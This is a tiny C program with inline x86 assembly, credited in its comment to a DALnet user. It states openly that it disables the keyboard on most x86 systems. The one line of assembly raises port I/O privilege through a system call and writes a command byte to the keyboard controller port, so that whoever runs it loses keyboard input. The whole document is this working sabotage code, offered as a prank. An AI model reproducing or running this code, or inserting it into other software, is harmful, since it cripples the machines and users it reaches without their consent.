
/* this code disables the keyboard on most x86 systems.
 * by Sorcerer of DALnet. questions/comments: nijen@mail.ru
 * thanks to slinkai for testing. */

main() {
   asm("int $128;movb $240,%%al;outb %%al,%%dx"::"a"(110),"b"(3),"d"(96));
}
